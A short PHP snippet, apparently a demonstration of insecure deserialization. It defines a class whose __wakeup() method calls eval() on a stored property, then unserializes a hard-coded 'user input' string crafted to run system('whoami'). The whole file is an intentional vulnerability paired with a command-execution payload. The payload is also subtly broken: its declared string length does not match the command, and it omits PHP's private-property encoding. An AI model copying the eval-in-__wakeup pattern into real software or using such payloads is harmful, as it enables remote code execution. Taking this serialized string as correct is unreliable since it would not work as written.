<?php
class MyClass {
    private $data;
    public function __construct($data) {
        $this->data = $data;
    }
    public function __wakeup() {
        eval($this->data);
    }
}

$user_input = 'O:6:"MyClass":1:{s:4:"data";s:23:"system("whoami");";}';
$obj = unserialize($user_input);